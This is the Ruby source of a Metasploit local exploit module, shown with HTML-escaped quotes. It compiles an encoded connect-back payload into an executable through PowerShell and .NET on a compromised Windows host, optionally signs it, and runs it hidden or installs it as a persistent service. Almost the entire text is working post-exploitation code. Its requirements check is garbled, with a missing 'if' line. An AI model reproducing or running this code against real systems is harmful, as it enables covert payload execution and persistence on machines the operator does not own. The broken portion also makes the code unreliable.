# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/post/windows/services&#039;
require &#039;msf/core/post/windows/powershell&#039;
require &#039;msf/core/exploit/powershell/dot_net&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Powershell::DotNet
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;                 => "Powershell Payload Execution",
      &#039;Description&#039;          => %q{
        This module generates a dynamic executable on the session host using .NET templates.
        sent to a modified PowerShell session with .NET 4 loaded. The compiler builds
        the executable (standard or Windows service) in memory and produces a binary
        which can be started/installed and downloaded for later use. After compilation the
        PoweShell session can also sign the executable if provided a path the a .pfx formatted
        certificate.
      },
      &#039;License&#039;              => MSF_LICENSE,
      &#039;Author&#039;               => [
        &#039;RageLtMan <rageltman[at]sempervictus>&#039;, # Module, libs, and powershell-fu
        &#039;Matt "hostess" Andreko&#039; # .NET harness, and requested modifications
      ],

      &#039;Payload&#039;        =>
        {
          &#039;EncoderType&#039;    => Msf::Encoder::Type::AlphanumMixed,
          &#039;EncoderOptions&#039; =>
        {
          &#039;BufferRegister&#039; => &#039;EAX&#039;,
        },
      },
      &#039;Platform&#039;      => [ &#039;windows&#039; ],
      &#039;Targets&#039; => [ [ &#039;Universal&#039;, {} ] ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 14 2012&#039;

    ))

    register_options(
      [
        OptBool.new(&#039;SVC_GEN&#039;, [false, &#039;Build a Windows service, which defaults to running as localsystem&#039;, false ]),
        OptString.new(&#039;SVC_NAME&#039;, [false, &#039;Name to use for the Windows Service&#039;, &#039;MsfDynSvc&#039;]),
        OptString.new(&#039;SVC_DNAME&#039;, [false, &#039;Display Name to use for the Windows Service&#039;, &#039;MsfDynSvc&#039;]),
        OptBool.new(&#039;START_APP&#039;, [false, &#039;Run EXE/Install Service&#039;, true ]),
        OptString.new(&#039;OUTPUT_TARGET&#039;, [false, &#039;Name and path of the generated executable, default random, omit extension&#039; ]),

      ], self.class)

    register_advanced_options(
      [
        OptString.new(&#039;CERT_PATH&#039;, [false, &#039;Path on host to .pfx fomatted certificate for signing&#039; ]),
        OptBool.new(&#039;SVC_REMOVE&#039;, [false, &#039;Remove Windows service named SVC_NAME&#039;]),
        OptBool.new(&#039;BypassUAC&#039;, [false, &#039;Enter credentials to execute envoker in .NET&#039;, false]),
        OptString.new(&#039;USERNAME&#039;, [false, &#039;Windows username&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [false, &#039;Windows user password - cleartext&#039;]),
        OptString.new(&#039;DOMAIN&#039;, [false, &#039;Windows domain or workstation name&#039;]),

      ], self.class)

  end

  def exploit

    # Make sure we meet the requirements before running the script
      print_error("Incompatible Environment")
      return
    end
    # Havent figured this one out yet, but we need a PID owned by a user, cant steal tokens either
    if client.sys.config.getuid == &#039;NT AUTHORITY\SYSTEM&#039;
      print_error("Cannot run as system")
      return
    end

    # End of file marker
    eof = Rex::Text.rand_text_alpha(8)
    env_suffix = Rex::Text.rand_text_alpha(8)

    com_opts = {}
    com_opts[:net_clr] = 4.0 # Min .NET runtime to load into a PS session
    com_opts[:target] = datastore[&#039;OUTPUT_TARGET&#039;] || session.fs.file.expand_path(&#039;%TEMP%&#039;) + "\\#{ Rex::Text.rand_text_alpha(rand(8)+8) }.exe"
    com_opts[:payload] = payload_script #payload.encoded
    vprint_good com_opts[:payload].length.to_s

    if datastore[&#039;SVC_GEN&#039;]
      com_opts[:harness] = File.join(Msf::Config.install_root, &#039;external&#039;, &#039;source&#039;, &#039;psh_exe&#039;, &#039;dot_net_service.cs&#039;)
      com_opts[:assemblies] = [&#039;System.ServiceProcess.dll&#039;, &#039;System.Configuration.Install.dll&#039;]
    else
      com_opts[:harness] = File.join(Msf::Config.install_root, &#039;external&#039;, &#039;source&#039;, &#039;psh_exe&#039;,&#039;dot_net_exe.cs&#039;)
    end

    com_opts[:cert] = datastore[&#039;CERT_PATH&#039;]

    if datastore[&#039;SVC_REMOVE&#039;]
      remove_dyn_service(com_opts[:target])
      return
    end
    vprint_good("Writing to #{com_opts[:target]}")

    com_script = dot_net_compiler(com_opts)
    ps_out = psh_exec(com_script)

    if datastore[&#039;Powershell::Post::dry_run&#039;]
      print_good com_script
      print_error ps_out
      return
    end
    # Check for result
    begin
      size = session.fs.file.stat(com_opts[:target].gsub(&#039;\\&#039;,&#039;\\\\&#039;)).size
      vprint_good("File #{com_opts[:target].gsub(&#039;\\&#039;,&#039;\\\\&#039;)} found, #{size}kb")
    rescue
      print_error("File #{com_opts[:target].gsub(&#039;\\&#039;,&#039;\\\\&#039;)} not found")
      return
    end

    # Run the harness
    if datastore[&#039;START_APP&#039;]
      if datastore[&#039;SVC_GEN&#039;]
        service_create(datastore[&#039;SVC_NAME&#039;], datastore[&#039;SVC_DNAME&#039;], com_opts[:target].gsub(&#039;\\&#039;,&#039;\\\\&#039;), startup=2, server=nil)
        if service_start(datastore[&#039;SVC_NAME&#039;]).to_i == 0
          vprint_good("Service Started")
        end
      else
        session.sys.process.execute(com_opts[:target].gsub(&#039;\\&#039;,&#039;\\\\&#039;), nil, {&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
      end
    end


    print_good(&#039;Finished!&#039;)
  end


  # This should be handled by the exploit mixin, right?
  def payload_script
    pay_mod = framework.payloads.create(datastore[&#039;PAYLOAD&#039;])
    payload = pay_mod.generate_simple(
      "BadChars"    => &#039;&#039;,
      "Format"      => &#039;raw&#039;,
      "Encoder"     => &#039;x86/alpha_mixed&#039;,
      "ForceEncode" => true,
      "Options" =>
       {
        &#039;LHOST&#039; => datastore[&#039;LHOST&#039;],
        &#039;LPORT&#039; => datastore[&#039;LPORT&#039;],
        &#039;EXITFUNC&#039; => &#039;thread&#039;,
        &#039;BufferRegister&#039; => &#039;EAX&#039;
      },
    )

    # To ensure compatibility out payload should be US-ASCII
    return payload.encode(&#039;ASCII&#039;)
  end

  # Local service functionality should probably be replaced with upstream Post
  def remove_dyn_service(file_path)
    service_stop(datastore[&#039;SVC_NAME&#039;])
    if service_delete(datastore[&#039;SVC_NAME&#039;])[&#039;GetLastError&#039;] == 0
      vprint_good("Service #{datastore[&#039;SVC_NAME&#039;]} Removed, deleting #{file_path.gsub(&#039;\\&#039;,&#039;\\\\&#039;)}")
      session.fs.file.rm(file_path.gsub(&#039;\\&#039;,&#039;\\\\&#039;))
    else
      print_error("Something went wrong, not deleting #{file_path.gsub(&#039;\\&#039;,&#039;\\\\&#039;)}")
    end
    return
  end

  def install_dyn_service(file_path)

    service_create(datastore[&#039;SVC_NAME&#039;], datastore[&#039;SVC_DNAME&#039;], file_path.gsub(&#039;\\&#039;,&#039;\\\\&#039;), startup=2, server=nil)
    if service_start(datastore[&#039;SVC_NAME&#039;]).to_i == 0
      vprint_good("Service Binary #{file_path} Started")
    end
  end

end

